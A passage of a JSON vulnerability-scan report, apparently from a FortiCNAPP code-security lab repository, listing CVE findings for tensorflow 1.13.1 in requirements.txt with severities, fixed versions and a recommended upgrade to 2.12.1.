            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36014 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36014](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36014)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0fbb11664d54cbdd91262bc539f3be57059c0a9c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35940",
          "ruleIndex": 351,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35940 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35940](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35940)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "4609e4c096aea4655f48f943d46202613a2b8509"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35970",
          "ruleIndex": 352,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35970 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35970](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35970)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "dc8183425f0b1f54ad80ac104b77a03e78d9b443"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36016",
          "ruleIndex": 353,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36016 (severity: low, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36016](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36016)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "30bcba28208f4864fb485b08d338b1132cb1a939"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35997",
          "ruleIndex": 354,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35997 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35997](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35997)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c7d561234d681226deaf6b9847ff25b33d577b7e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35991",
          "ruleIndex": 355,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35991 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35991](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35991)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2bcec2a8870c926763be779258017546024b01fe"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35993",
          "ruleIndex": 356,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35993 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35993](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35993)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "756fd17cd42a50c107eb95bb61e5563334c41f31"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36018",
          "ruleIndex": 357,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36018 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36018](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36018)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c3098e24aea99712464cf856a31242d11cb01fdc"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35984",
          "ruleIndex": 358,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35984 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35984](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35984)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "937d3a58c5b2ffb2f25c515c0950a59436c58999"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35937",
          "ruleIndex": 359,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35937 (severity: high, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35937](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35937)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5104435b7ce2ba915e887b1b6a583c93b8d63ff0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35965",
          "ruleIndex": 360,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35965 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35965](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35965)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c46b7688078bf70e25bda2c4587d4ad34d7fc769"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35998",
          "ruleIndex": 361,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35998 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35998](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35998)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "cf40a5d9d1f38d0ae0472c7d9e06edd250a04973"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35941",
          "ruleIndex": 362,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35941 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35941)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "aa2864a6612c8e843fa7a9c743b6d878108d33dd"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35986",
          "ruleIndex": 363,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35986 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35986](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35986)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ae7c4bca0fe7ac2af651f36a73d627832f4f69ee"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36017",
          "ruleIndex": 364,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36017 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36017](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36017)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f88a1f0aaf2b3d2489d3919c715f96913d7a67fe"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36026",
          "ruleIndex": 365,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36026 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36026](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36026)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "4c39299503cc19538f4ec13aec3d8b00c1f8b92a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35990",
          "ruleIndex": 366,
          "level": "warning",
          "message": {
